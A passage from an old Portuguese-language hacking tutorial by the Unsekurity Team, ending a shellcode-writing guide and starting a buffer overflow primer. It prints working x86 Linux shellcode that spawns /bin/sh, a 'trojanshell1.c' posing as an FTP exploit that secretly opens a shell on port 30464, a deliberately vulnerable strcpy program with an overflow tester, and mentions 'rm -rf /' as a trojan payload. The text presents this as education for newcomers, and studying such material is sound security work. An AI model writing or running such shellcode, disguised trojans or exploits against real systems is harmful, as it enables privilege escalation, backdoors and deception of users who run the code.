        "\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
        "\xfe\xc5"                      /* incb %ch              */
        "\xb1\xed"                      /* movb $0xed,%cl        */
        "\xcd\x80"                      /* int $0x80             */
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\x8d\x5e\x05"                  /* leal 0x5(%esi),%ebx   */
        "\xb0\x3d"                      /* movb $0x3d,%al        */
        "\xcd\x80"                      /* int $0x80             */
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\xbb\xd2\xd1\xd0\xff"          /* movl $0xffd0d1d2,%ebx */
        "\xf7\xdb"                      /* negl %ebx             */
        "\x31\xc9"                      /* xorl %ecx,%ecx        */
        "\xb1\x10"                      /* movb $0x10,%cl        */
        "\x56"                          /* pushl %esi            */
        "\x01\xce"                      /* addl %ecx,%esi        */
        "\x89\x1e"                      /* movl %ebx,(%esi)      */
        "\x83\xc6\x03"                  /* addl %0x3,%esi        */
        "\xe0\xf9"                      /* loopne -0x7           */
        "\x5e"                          /* popl %esi             */
        "\xb0\x3d"                      /* movb $0x3d,%al        */
        "\x8d\x5e\x10"                  /* leal 0x10(%esi),%ebx  */
        "\xcd\x80"                      /* int $0x80             */
        "\x31\xc0"                      /* xorl %eax,%eax        */
        "\x89\x76\x08"                  /* movl %esi,0x8(%esi)   */
        "\x89\x46\x0c"                  /* movl %eax,0xc(%esi)   */
        "\xb0\x0b"                      /* movb $0xb,%al         */
        "\x89\xf3"                      /* movl %esi,%ebx        */
        "\x8d\x4e\x08"                  /* leal 0x8(%esi),%ecx   */
        "\x8d\x56\x0c"                  /* leal 0xc(%esi),%edx   */
        "\xcd\x80"                      /* int $0x80             */
        "\xe8\xac\xff\xff\xff"          /* call -0x54            */
        "/bin/sh";                      /* .string \"/bin/sh\"   */

void main(){
int *retorno;
retorno = (int *)&retorno +2;
  (*retorno) = (int)shellcode;

}

Voce pode  testa-lo em  sua maquina,  mas ele  eh util,  mais para  o pessoa que
tentarah executar algum  comando malicioso como  root.De qualquer forma,  ele eh
bastante util para propositos educacionais!!:)


7.4 Dividas Para o Proximo Tutorial
------------------------------------

Eu vou ficar  devendo algumas coisas  que jah estao  preparadas amigo, mas  como
voce pode ver,  este assunto nunca  estah completo, tem  mais de 2000  linhas de
texto aqui, e isso eh apenas o basico, queria colocar mais coisas, mas vai ficar
para o proximo,  ou mesmo para  um mais avancado,  nao sei se  feito por mim  ou
algum outro membro do grupo, quem sabe ateh outros grupos nao se antecipam,  nao
sei, mas espere um pouco. De ante-mao, digo algumas coisas, eh possivel se fazer
muitos shellcodes, o que se faz necessario eh um maior aprendizado de  assembly,
e como  sempre, bons  algoritmos ajuda.Eu  dei algumas  dicas de  shellcodes que
podem ser feitos facilmente amigo, nao investi em truques, pode-se usar  truques
que facilitam as coisas, mas tem que saber o que se estah fazendo, como aqui  eh
voltado para NewBie, nao direi truques ainda.

Gostaria de deixar um aviso do porque  da necessidade de se conhecer ao menos  o
basico sobre isso, em essencial sobre assembly.Essas linhas eu direciono para os
kiddies,  que  pegam  todo  e  qualquer exploit  e  jah  vai  logo  compilando e
executando, em busca da  primeira rede bugada que  encontrar, gente que anda  em
canais  querendo trocar  shell, como  se o  pessoal que  manja mesmo  estivesse
interessado nisso, se liga mano, o  pessoal que manja, primeiro nao sai  por aih
dizendo que invadiu isso  ou aquilo, ou mesmo  chega ao ponto de  trocar shells,
existem  muitos  motivos  para  eles  fazerem  isso,  coisas  que  kiddies   nao
entenderiam. Mas de qualquer forma, amigo  Newbie, veja um exemplo de um  trojan
horse inserido num shellcode abaixo.

------------------------ trojanshell1.c ------------------------------
/* Exemplo de um trojan horse que abre uma porta(30464) com
   shell do usuario que o executou.
   Desenvolvido por Nash Leon com base no Shellcode
   do Taeho Oh ( ohhara@postech.edu ).
   Agradecimentos a Magic Kiss e ao Unsekurity Team.
   nashleon@yahoo.com.br
*/


#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <netinet/in.h>

char shellcode[]=
"\x31\xc0\xb0\x02\xcd\x80\x85\xc0\x75\x43\xeb\x43\x5e\x31\xc0"
"\x31\xdb\x89\xf1\xb0\x02\x89\x06\xb0\x01\x89\x46\x04\xb0\x06"
"\x89\x46\x08\xb0\x66\xb3\x01\xcd\x80\x89\x06\xb0\x02\x66\x89"
"\x46\x0c\xb0\x77\x66\x89\x46\x0e\x8d\x46\x0c\x89\x46\x04\x31"
"\xc0\x89\x46\x10\xb0\x10\x89\x46\x08\xb0\x66\xb3\x02\xcd\x80"
"\xeb\x04\xeb\x55\xeb\x5b\xb0\x01\x89\x46\x04\xb0\x66\xb3\x04"
"\xcd\x80\x31\xc0\x89\x46\x04\x89\x46\x08\xb0\x66\xb3\x05\xcd"
"\x80\x88\xc3\xb0\x3f\x31\xc9\xcd\x80\xb0\x3f\xb1\x01\xcd\x80"
"\xb0\x3f\xb1\x02\xcd\x80\xb8\x2f\x62\x69\x6e\x89\x06\xb8\x2f"
"\x73\x68\x2f\x89\x46\x04\x31\xc0\x88\x46\x07\x89\x76\x08\x89"
"\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31"
"\xc0\xb0\x01\x31\xdb\xcd\x80\xe8\x5b\xff\xff\xff";

void trojan();
main(int argc, char *argv[]){
char *vitima;
int Meusocket;
struct hostent *he;
struct sockaddr_in lascado;
if(argc < 2){
printf("Uso: %s <host_bugado>\n",argv[0]);
exit(0);
}

vitima = argv[1];


he = gethostbyname(vitima);
if (he < 0){
printf("Host Desconhecido mano!!\n");
exit(1);
}
Meusocket = socket(AF_INET, SOCK_STREAM, 0);
if(Meusocket < 0){
fprintf(stderr,"Erro no socket mano!!\n");
exit(1);
}
lascado.sin_family = he->h_addrtype;
lascado.sin_port = htons(21);
lascado.sin_addr = *((struct in_addr *)he->h_addr);
bzero(&(lascado.sin_zero), 8);
if(connect(Meusocket,(struct sockaddr * )&lascado, sizeof(lascado)) ==0){
printf("Erro em connect() mano!!\n");
close(Meusocket);
trojan();
}
else {
printf("Falha no overflow mano!!\n");
close(Meusocket);
}
void trojan(){
int *retorno;
retorno = (int *)&retorno +2;
  (*retorno) = (int)shellcode;

}
-----------------------------------------------------------------

Eh obvio e evidente que este trojan pode ser melhorado, mas coloquei ele simples
assim, soh para dar uma ideia do perigo que eh voce executar exploits dos outros
sem  ter  conhecimento   de  no  minimo   o  que  estarah   sendo  executado  no
programa.Qualquer um com poucos conhecimentos  em C veria que as  ultimas linhas
sao suspeitas, mas e quanto ao shellcode, que vem parecido em muitos exploits???
Os kiddies executam algo sem nem mesmo ter ideia do perigo.O trojan acima abre a
porta  30464, que  jah eh  amplamente difundida  nesse exemplo  de shellcode  na
internet, mas ela pode facilmente ser alterada, e entre as dividas que deixarei,
eh explicar passo por passo, a escrita e funcionamento deste shellcode. Se  voce
tem alguma vitima, voce terah que adaptar esse exploit, mas fica aih o conceito,
voce poderia muito bem  alterar o conteudo, camuflar  a funcao trojan, ou  mesmo
inserir o codigo dentro de main,  existem dezenas de formas de se  melhorar isso
aih em cima, coloquei simples porque nao quero ser responsavel por nada!!Escrevi
esse  trojan  apenas  com  proposito  educacional!!Nao  me  responsabilizo   por
eventuais danos  que alguem  pode gerar  com o  uso dele!!!  Outra ilustracao do
perigo que os  kiddies passam quando  executam exploits dos  outros, eh executar
exploits como root.Alguem poderia muito bem fazer um trojan igual a este, mas ao
inves de abrir uma porta com shell, executaria um comando como por exemplo: " rm
-rf /".  Isso eh  um aviso  para aquele  pessoal que  pensa que entrar para esse
mundo underground eh brincadeira!!!

Pretendo  em tutoriais  futuros disponibilizar  shellcodes quase  tao perigosos
quanto este,  vai depender  de alguns  fatores.Voce jah  deve estar contemplando
muitas teorias amigo..:)...Mande brasa.

Tou devendo a solucao de muitas coisas que ficaram pendentes aqui, como executar
comandos de tamanho maior  de /bin/ls ou /bin/sh.  Tambem tou devendo uma  maior
insercao em shellcodes contra filtros. Um shellcode para acrescentar usuario  ou
usuarios num  passwd.Muita coisa  boa, em  breve, estarah  disponivel para  voce
amigo.Fique  atento  a home  page  do grupo  Unsekurity  Team, estaremos  sempre
disponibilizando tutoriais e textos diversos de nivel, voltado mais a galera que
de fato quer aprender.

Espero que os exemplos tenham ficado claros,  e que sirvam de algum modo a  voce
nessa longa jornada que estamos fazendo.


----------------
8 - TERMINANDO  |
----------------

Ultimo capitulo dessa nossa fase inicial de escrita de shellcodes, nada mais que
uma breve despedida.



8.1 DIFERENCAS ENTRE A SINTAXE AT&T E A SINTAXE INTEL
-------------------------------------------------------

* Os nomes dos registradores sao precedidos por "%" , alguns exemplos sao:
%eax, %ebx, %ecx, %edx, %esi, %edi e %ebp, que correspondem a ax,bx,cx,dx
si,di e bp na sintaxe INTEL.

* Na sintaxe INTEL, primeiro vem o destino, depois a fonte(source) ou
origem.Exemplo: mov ah,002. Na sintaxe AT&T eh o inverso primeiro vem a
fonte ou origem(source), e no fim o destino, exemplo: movl $2, %eax

* Operandos imediatos sao marcados com um prefixo $, como em addl $3,%eax
  (adiciona valor 3 p/ registrador %eax).

* O tamanho do operando eh especificado com um sufixo do tipo da instrucao.
  O sufixo eh b para byte(8 bits), w para word(16 bits), e l para long(32
  bits).Exemplo: movw %dx,%ax. Todavia, em muitos sistemas, na sintaxe
  AT&T, o uso desses sufixos sao opcionais, onde por padrao eh long, ou
  32 bits.

* A falta de prefixo p/ um operando indica que ele eh um endereco de
  memoria. Como vimos movl $foo,%eax coloca o endereco da variavel
  foo no registrador %eax, mas movl foo,%eax coloca o conteudo da variavel
  foo no registrador %eax.


8.2 - Links e Referencias
---------------------------

Sao  varias  as  referencias  usadas  para  a  escrita  deste  tutorial, algumas
compilacoes  minhas aqui  mesma, foram  usadas, coisas  bem antigas,de  qualquer
forma, as referencias abaixo podem e devem ser uteis para um Newbie.

"Smash The Stack For Fun e Profit" - PHRACK 49-14, by Aleph 0ne.
 Pode ser obtido em : www.phrack.com
		      www.2600.com/phrack/


"Advanced Buffer Overflows" - Taeho Oh.
Pode ser obtido em: http://postech.edu/~ohhara
		    www.securityfocus.com
	 	    http://packetstorm.securify.com

"Curso de assembly" - Frederico Pissarra.
Pode ser obtido em: www.assembly.8m.com

"Turbo C Avancado" - Herbet Schildt. Editora: McGraW-Hill

Alguns links onde voce pode obter mais informacoes sobre assembly:

www.assembly.8m.com
www.ice-digga.com/programmig/bmp.html
www.strangecreations.com/library/assembly/tutor
www.nuvisionmiami.com/kip/asm.htm


8.3 - Consideracoes Finais
---------------------------

Bem amigo, aqui eh soh bobagem, se  nao tiver disposto, pode fechar o editor  de
texto ou o browser,  ou qualquer programa que  esteja usando para ler  isso, bem
como o caderno ou folhas de papel. Escrever tutoriais voltados para Newbie eh ao
mesmo  tempo  gratificante  e  dificil.Gratificante  porque  dah  a  sensacao de
estarmos empurrando uma gigantesca roda  de informacoes, num constante ciclo  em
busca de  maior liberdade  de informacao,  bem como  de troca de informacoes.Sao
poucos os textos sobre  escrita de shellcodes em  portugues, nao quero com  isso
desmerecer os que os fizeram, ao contrario, sou grato sim a esse pessoal que  de
fato contribui ou contribuiu durante algum tempo para que esta roda  continuasse
girando.Mais uma vez  direciono umas palavras  a "elite" de  fucadores nacional,
ateh quando???  Vemos muitos  garotos fazendo  bobagens como  mudar home pages e
etc, mas de quem eh a culpa?? Se existem culpados, nao quero acusar o pessoal da
seguranca, pois o pessoal  da seguranca tem se  mostrado fraco porque ateh  hoje
soh se depararam  com garotos que  no maximo derrubam  um provedor ou  mudam uma
home page, mas todos nos sabemos  que por tras das cameras tem  crackers capazes
de fazer o que quiserem com sistemas que valem milhoes, tendo acesso a todo tipo
de informacao, desde  cartoes de creditos,  ateh mesmo projetos  que podem valer
milhoes ou mesmo destruir milhoes.Nao gosto de crackers, e nao eh para eles  que
escrevo, sei que aqui no pais,  existem pessoas com decadas, isso mesmo,  muitos
anos de hacking, mas que se encontram quietos.Cada um possui o direito de agir e
pensar da forma que quiser, mas quando os kiddies mudam uma home page e a  midia
cai em  cima, chamando-os  de "hackers",  creio que,  de uma  forma ou de outra,
esses que se  encontram quietos tambem  sao culpados por  tal situacao.Isso tudo
jah aconteceu lah fora, tah acontecendo aqui, os mais espertos sabem no que isso
vai dar  e jah  estao se  precavendo.Depois de  muitos anos  resolvi aparecer no
cenario porque de fato temo que hackers  que verdade paguem o preco pelo que  os
kiddies e  crackers(sabemos que  existem e  ateh quem  sao) andam fazendo.Nao se
apavorem quando pintar uma operacao nos moldes da Sun Devil aqui no pais, porque
temos ateh entao sido cumplices do jogo que a "seguranca" tem tramado.

Manifesto a  parte, gostaria  de agradecer  ao pessoal  que tornou possivel este
tutorial, sao tantas pessoas, mas se esqueci de alguem, espero a compreensao  do
mesmo, o tempo continua a ser meu inimigo.

Thanks Magic Kiss, module, raynox, xf86config, psych, e-brain, cs0,
       t[rex], Blind_Bard, Dinamite_, d3m3ns, CeZiNHa, meu grande amigo
       zip, thunderoffire, ocorvo, arse, kaervek, cdma, Matt_Salermo,
       Thanath0s e aos demais grupos que contribuem mundialmente
       para que haja maior liberdade de informacao.


Fiquem  atentos a  home page  do Unsekurity  Team, novos  materias devem  estar
disponiveis por estes dias.Sem mais.

				       Nash Leon vulgo coracaodeleao.


------------------------------ EOF -------------------------------------





=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=[ 14 ]=-=[ Básico Buffer Overflow ]=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

#############################################################################
########################### UNSEKURITY TEAM #################################
#############################################################################

IP_FIX: Atual Clube dos Mercenários, http://cdm.frontthescene.com.br

                               OVERFLOWS

"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

Segmentation Fault!

Desenvolvido por Nash Leon vulgo coracaodeleao.
nashleon@yahoo.com.br
Thanks Magic kiss e Unsekurity Team.
Voce pode encontrar este e outros textos em:
http://unsekurity.virtualave.net/


AVISO:  NAO NOS RESPONSABILIZAMOS PELO MAU USO DAS INFORMACOES AQUI CONTIDAS,
        ESSAS INFORMACOES TEM SOMENTE PROPOSITO EDUCACIONAL.NADA DE BOBAGENS!



Sao varios os pre-requisitos p/ a leitura e o entendimento desse arquivo  texto.
Vamos partir do pre-suposto que voce sabe programar em C, conhece bem o  sistema
operacional linux, pois como muitos, esse txt estah voltado somente p/  sistemas
operacionais linux,  digo sistemas,  porque hj  em dia  ha muita diferenca entre
Slack, Debian  e REd  sux. Faz  necessario um  conhecimento basico  de assembly,
existe um texto voltado justamente p/  a programacao de shellcodes na home  page
citada acima que  poderah ajudar, mas  eh bom ter  em mente mais  material sobre
assembly.Mais uma vez, esse  txt eh voltado p/  "Newbies", se voce eh  elite vah
procurar outro material,  as teorias aqui  nao serao aproveitadas  por voce,caso
seja elite!!!Como nos  demais txts que  escrevi, vou tentar  ser o mais  pratico
possivel, e nesse nao serah diferente. Se quiser se aprofundar mais no  assunto,
no  fim  desse  txt  colocarei  alguns  links  onde  vc  poderah  encontrar mais
informacoes sobre esse tao fascinante  assunto.Eu iria me aprofundar ao  maximo,
mas o velho inimigo conhecido como  tempo tem me vencido em muitas  batalhas, de
modo que  pretendo nesse  txt ficar  no basico  do basico,  mas jah tem material
futuro sendo preparado.Espere e verah!

Bem,depois de toda essa ladainha,vamos trabalhar.

------------------------------- INDICE -----------------------------------

1.INTRODUCAO
  1.1  O que eh um buffer overflow
  1.2  Tirando proveito
  1.3  Modelo usual de memoria
2.O STACK OU A PILHA
3.SHELLCODE
  3.1 Shellcode /bin/sh
4.FAZENDO UM STACK OVERFLOW
5.PROBLEMAS COM EXPLOITS
6.O HEAP - A NOVA ERA??
  6.1 Alocacao dinamica em C
7.HEAP OVERFLOW
8.O PROJETO OMEGA
9.PROCURANDO FUROS
10.TERMINANDO
   10.1 Links e Referencias
   10.2 Consideracoes Finais
---------------------------------------------------------------------------



----------------
1. - INTRODUCAO |
----------------

Buffer overflows nao eh  coisa nova.Comenta-se que desde  a decada de 70  jah se
tinha ideia do potencial desse problema, os programas em C estavam se  firmando,
e a medida  que o tempo  passava, os programadores  iam crescendo em  numero,mas
diminuindo em cuidados.No entanto, a popularizacao dessa tecnica soh se efetivou
com a chegada do "poderoso worm" de Robert Morris, comecava uma nova geracao  de
problemas p/  os administradores  de redes,  essa popularizao  dessa tecnica foi
muito gradual, poucos eram os  documentos disponiveis,fazendo com que a  "elite"
mantivesse o controle  total dela, mas  como nem tudo  dura p/ sempre,  em 1994,
surgem  reforcos no  intuito de  massificar os  conhecimentos nessa  area, isso
culmina  com  os excelentes  textos  feito pela  PHRACK  e pelo  pessoal  da The
Hacker's Choice.A realidade disso tudo,  eh que ainda hoje ocorrem  muitos erros
de programacao,surgem novas ferramentas que  se dizem "capazes" de nao  permitir
mais um stack overflow, bem como novos programas que procuram bugs, e ateh mesmo
fazedores de shellcodes.Voce deve estar  se perguntando, se tem tudo  isso,estou
perdendo  meu  tempo  lendo  isso  aqui??Assim  como  muitos,eu  era  um  grande
dependente de fucadores de fora, ficava  agindo igual a um kiddie, ateh  que num
belo dia, surgiu um bug fantastico  que estava sendo explorado por pouca  gente,
mas  como eu  era dependente  e ninguem  era louco  p/ publicar  o programa  que
explorava esse bug,eu percebi que se eu dependesse dos outros,jamais poderia  de
fato  ter  acesso  a sistemas  grandes,bem  como  poder um  dia  ser  chamado de
fucador.O que eu disse eh o rumo  natural das coisas, se chegou ateh aqui,  deve
ser porque  quer caminhar  mais longe,fazer  seus proprios  exploits,e descobrir
bugs por conta propria,  espero que esse txt  seja util p/ alguem,  quem dera eu
tivesse um desse quando comecei a pesquisar sobre isso!!

---------------------------------------------------------------------------

--------------------------------
1.1 O QUE EH UM BUFFER OVERFLOW |
--------------------------------

Os programas  que manipulam(recebem)  variaveis necessitam  de buffers,  que sao
locais na memoria onde sao guardados os dados que as variaveis recebem, no nosso
caso.Quando se declara num  programa uma variavel com  tamanho X, e na  execucao
desse programa essa variavel termina recebendo dados maiores que X, entao ocorre
o que chamamos de "BUFFER OVERFLOW".Quando isso ocorre,na maioria da vezes, voce
receberah uma "Segmentation Fault", isso poderah servir como pista, pois  muitas
vezes  quando isso  ocorre, o  programa executado  poderah ser  vulneravel a  um
buffer overflow.Um exemplo pratico de uma vulnerabilidade deste tipo eh mostrado
abaixo:

/* PROGRAMA BUGADO - EXEMPLO PRATICO P/ TXT SOBRE OVERFLOWS
Compile com $gcc -o bug1 bug1.c */

#include <stdio.h>
#include <stdlib.h>

main(int argc, char *argv[]){
char buffer[512];
if(argc < 2){
printf("Programa bugado!!\n");
printf("Uso: %s <string>\n",argv[0]);
exit(0);
}
strcpy(buffer,argv[1]);
printf("Voce digitou %s!!\n",buffer);
return 0;
}

Este eh o exemplo  mais classico que existe.A  funcao strcpy() copia o  que voce
digitar na linha de comando(argv[1]) p/ o buffer declarado (buffer) e como  esta
funcao nao faz checagem de tamanho, entao bomba!!
Esse programa eh vulneravel a um buffer overflow.
Teste ele digitando mais de 512 bytes em argv[1].Uma forma pratica seria:

[localhost: /]$./bug1 `perl -e 'printf "A" x 530'`

Se nao possui perl instalado tente na mao mesmo:

[localhost: /]$./bug1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...

Um monte de As.

Ou se preferir, use o programa abaixo:

---------------------------------------------------------------------

/* Simples programa para ver se determinado
   programa eh vulneravel a um buffer overflow.
   Desenvolvido por Nash Leon e Unsekurity Team.
   Thansk Ramona.
*/

#include <stdio.h>
#include <stdlib.h>

/* Altere o PATH conforme o local que se encontra o arquivo bugado, bem
   como  o tamanho que iremos usar p/ sobrescrever o buffer */

#define   PATH      "/tmp/bug1"
#define    A         0x41
#define   TAMANHO    600

main(int argc, char *argv[])
{
int i;
char *buffer = (char *)malloc(TAMANHO);

memset(buffer, A, TAMANHO-1);
printf("Enchendo o buffer com caracter A !\n");
execl(PATH,"bug1",buffer,0);
}
----------------------------------------------------------------------

Isso eh soh um programa exemplo, voce pode alterar ele e fazer dele um  checador
de todo e qualquer programa que utilize a linha de comando para pegar argumentos
para uma variavel.Fica aih a concepcao, talvez divulgue em breve algo melhor que
possuo em maos.

Verifique a resposta que surgirah 'Segmentation fault'.Isso serah bastante comum
durante nosso estudo.

Vamos analisar varios codigos usando  a ferramente gdb (Debugador GNU).  Se voce
nao tiver,ele  eh um  software gnu(super  gratuito!!!) voce  poderah acha-lo  em
qualquer mirror de softwares ou distribuicoes linux que se preze. www.gnu.org  ;
ftp://ftp.cdrom.com/pub/gnu.Veremos agora como tirar proveito disso tudo.



-----------------------
1.2 - TIRANDO PROVEITO |
-----------------------

Sabemos entao quando ocorre um buffer overflow,quando colocamos mais dados que o
programa  pode  suportar.Mas  qual  o intuito  disso  tudo?  Um  programa quando
executado possui algumas particularidades,  dentre elas destaca-se um  artificio
usado na computacao p/ que apos o termino da execucao desse programa, o  sistema
retome  ao estado  que se  encontrava antes,  o nome  dado a  este artificio  eh
"retorno".Mas  para   que  isso   possa  acontecer,   faz-se  necessario  alguns
procedimentos:  Primeiro,   salva-se  o   endereco  na   memoria  referente   ao
retorno(endereco de retorno) no stack, se a execucao normal do programa termina,
o CPU irah  saltar(jmp) para o  endereco de retorno(return  address) e continuar
normalmente.Mas se  alterarmos a  execucao normal  do programa  usando um buffer
overflow  a  coisa  muda,se  escrevermos  mais  dados  em  uma  variavel  e esse
enchimento alcancar e sobrescrever  a regiao da memoria  onde estah o codigo  de
retorno entao ocorre o chamado  "overflow".Fazendo isso poderemos mudar o  curso
de um  programa, inserindo  codigos nossos  capazes de  executar comandos como o
dono do  programa(nosso alvo  serao as  suid root,  programas do  superusuario),
entao alterando o endereco de retorno, poderemos fazer com que nosso codigo  que
estah  seguindo  num argumento  de  uma funcao  p/  encher um  buffer  possa ser
executado.
Mais abaixo seguirao melhores explicacoes de como se fazer isso.


------------------------------
1.3 - MODELO USUAL DE MEMORIA |
------------------------------

O  modelo usual  de memoria  difere de  sistema para  sistema.Em Linux/i186  ela
possui modelo flat de 32 bit.Um  programa pode ser dividido em secoes.As  secoes
sao .text para seu codigo, .data para seus dados, .bss para dados indefinidos.Os
programas devem ter no minimo a secao .text.
Um esquema para visualizacao disso seria:

                        -------------------
                       |       .DATA       |
                       | (Stack e Heap)    |
                        -------------------
                       |       .BSS        |
                       |      (Heap)       |
                        -------------------
                       |       .TEXT       |
                        -------------------


Como vimos  acima, eu  coloquei as  respectivas regioes  onde ocorrem  overflows
relacionados.Stack overflows ocorrem na regiao .data, heap tambem pode ser usado
p/  sobrescrever  essa  regiao  (.data),   mas  eh  usualmente  mais  usado   p/
sobrescrever a regiao .bss.
Se voce leu o texto sobre  programacao de shellcodes na page do  Unsekurity Team
verah que nao eh mera coincidencia..:)
As regioes onde ocorrem  os overflows serao estudadas  com mais detalhes mais  a
frente.Quanto a regiao .TEXT,  como dito acima, ela  eh a reponsavel por  conter
segmentos de codigos,os  dados nesse segmento  sao instrucoes em  assembly que o
processador executa.Veremos embaixo um outro  modelo usual, soh que para  uso de
memoria em C.

        Alta
                 ---------------
                |     Stack     |
                 ---------------
                |               |
                | Memoria Livre |
                | para alocacao |
                |    (heap)     |
                |               |
                 ---------------
                | Var. globais  |
                 ---------------
                |               |
                |   Programa    |
                |               |
                 ---------------
        Baixa


Essa eh uma  visao conceitual do  uso de memoria  no C, o  que temos que  ter em
mente, e  o que  mais nos  importa no  momento, eh  diferenciar as  regioes onde
ocorrem os dois tipos de overflows que serao descritos aqui, a regiao Stack e  a
regiao Bss onde podemos fazer heap overflows. Lembrando tambem que isso tudo aih
eh imaginario, nao vah pensando que eh um quadradinho perfeitinho que vai  sendo
enchido nao!!

------------------------------------------------------------------

---------------------
2. O STACK OU A PILHA|
---------------------

A  regiao   conhecida  como   STACK  ou   pilha,  eh   responsavel  por  receber
dados(argumentos)  e  passa-los  p/   as  funcoes.Essa  regiao  possui   tamanho
relativo(muda quase sempre).O nome que se dah a essa regiao(STACK) eh porque ela
pode ser comparada a uma pilha, onde voce vai enchendo ela de dados, soh que ela
possui uma  particularidade.Essa particularidade  consiste em:  O ultimo  dado a
entrar serah  o primeiro  a sair,  chamamos isso  de LIFO  - last  in, first out
(ultimo a  entrar,primeiro a  sair). Na  medida em  que eh  usado, o  Stack ou a
pilha,chamarei de Stack, cresce p/  baixo, sendo assim, a quantidade  de memoria
necessaria eh determinada da maneira como o programa foi projetado.Por  exemplo,
um programa com muitas funcoes recursivas utiliza mais memoria  no Stack do  que
um  programa  sem funcoes  recursivas,  justamente porque  variaveis  locais sao
armazenadas  no  Stack.A  parte  necessaria  para  o  programa  e  as  variaveis
globais(citadas no esquema de memoria acima), eh determinada durante a  execucao
do programa.
Uma  pilha(Stack) eh  o contrario  de uma  fila,porque usa  o acesso  "ultimo a
entrar,  primeiro  a  sair", denominado  LIFO.Para  visualizar  um Stack,  basta
imaginar uma pilha de pratos.O prato da base do Stack eh o ultimo a ser usado  e
o  prato  do topo,  o  primeiro.Stacks sao  geralmente  utilizados em  softwares
basicos, incluindo  compiladores e  interpretadores.Geralmente o  C usa  o Stack
quando passa  parametros(argumentos) as  funcoes.Dois comandos  em assembly  sao
usado  para  enviar   e  retirar  dados   do  Stack,  sao   eles  push  e   pop,
respectivamente.

Veremos abaixo o esquema de um Stack em acao:

         Acao                   Conteudo do Stack
        ------                ---------------------

       push(A)                          A
       push(B)                          A  B
       push(C)                          A  B  C
       pop()  /* retira o ultimo */     A  B
       push(N)                          A  B  N
       pop()                            A  B
       pop()                            A
       pop()                            /* vazio */



Vemos acima o esquema da LIFO - ultimo a entrar,primeiro a sair.
Isso eh mais do que o suficiente,  espero que tenha ficado claro as coisas  para
voce,amigo!!Vamos esquentar mais as coisas.


-------------
3. SHELLCODE |
-------------

Eu fiz um txt sobre escrita de shellcodes e voce pode encontrar ele na home page
citada acima.Ele eh bem completo e  ensina ateh um basico sobre assembly,  entao
amigo,   se  quiser   obter  mais   dados  sobre   isso,  olhe   na  home   page
"http://unsekurity.virtualave.net/", procure esse  texto porque lah  possui mais
informacoes basicas e detalhadas sobre a escrita de shellcodes. Mas nesse  daqui
darei uma breve explicacao sobre eles e o porque de se usa-los.
No exemplo inicial, o do capitulo 1.1,  vimos como encher um buffer com As,  mas
isso nao eh proveitoso,o que se poderia fazer com isso eh tao somente  conseguir
um DoS(Denial of  Service) em servicos  remotos p/ intuitos  nada simples.Tambem
vimos no  capitulo 1.2  que podemos  sobrescrever o  endereco de  retorno(return
address).Se podemos fazer isso tudo entao devemos raciocinar, ao invez de  tacar
um monte de As, por que  nao colocarmos codigos de maquina para  executar alguma
coisa, jah que podemos sobrescrever o endereco de retorno p/ apontar para  algum
lugar na  memoria aonde  estah inserido  nosso codigo??  Exato!!Isso nao  soh eh
possivel como eh um fato!!Nao tenho conhecimento do cara que descobriu  isso,mas
deve-se muito a ele!
Sobrescrevendo o endereco de retorno fazendo-o apontar p/ o inicio de um  codigo
nosso,  podemos  executar  o  codigo  como  se  fossemos  o  dono  do   programa
bugado!!Geralmente se procura bugs em programas com suid root ou mesmo em  sgid,
que  nos  dao  boas  permissoes.Digo isso  porque  em  breve  descreverei alguns
esquemas para banco de dados tambem, coisas um pouco diferentes, fique ligado!:)
Bem como dito,  o codigo que  geralmente usamos, eh  chamado de shellcode,  pois
executamos  ele  como se  fosse  uma linha  de  comando.Descreverei aqui  alguns
shellcodes,mas nesse texto especifico sobre shellcodes dito acima,  encontram-se
mais exemplos.
Na  maioria das  vezes, em  exploits locais,  tudo que  queremos eh  executar o
comando "/bin/sh" ou "/bin/bash" como  se fosse root.Abaixo segue um  esquema de
shellcode para um desses citado:

3.1 - SHELLCODE /BIN/SH
------------------------

Esse  existe por  aih e  eh amplamente  difundido,tentarei ser  bem pratico  ao
descrever  como  se  criar  um shellcode  deste  tipo,lembrando,  nesse  txt nao
ensinarei  nada sobre  assembly, se  quiser aprender  algo,leia o  outro. Vamos
lah,veremos agora o codigo em C responsavel pela execucao desse dito cujo:

/* Comecando a criar um shellcode */

#include <stdio.h>
main(){
char *comando[2];
comando[0]="/bin/sh";
comando[1]=NULL;
execve(comando[0],comando,NULL);
}

Compilamos esse programa da seguinte forma usando gcc:
[localhost:/]$gcc -o shell -static -ggdb shell.c

Apos compilarmos o mesmo, usamos o gdb para analisar seu codigo em asm:

[localhost:/]$ gdb shell
GNU gdb 4.18
Copyright 1998 Free Software Foundation, Inc.
GDB is free software, covered by the GNU General Public License, and you
are welcome to change it and/or distribute copies of it under certain
conditions. Type "show copying" to see the conditions.
There is absolutely no warranty for GDB.  Type "show warranty" for details.
This GDB was configured as "i686-pc-linux-gnulibc1"...
(gdb)

Em seguida digitamos "disassemble main", para que o gdb nos forneca o
codigo da funcao main em linguagem assembly.Veremos:

(gdb) disassemble main
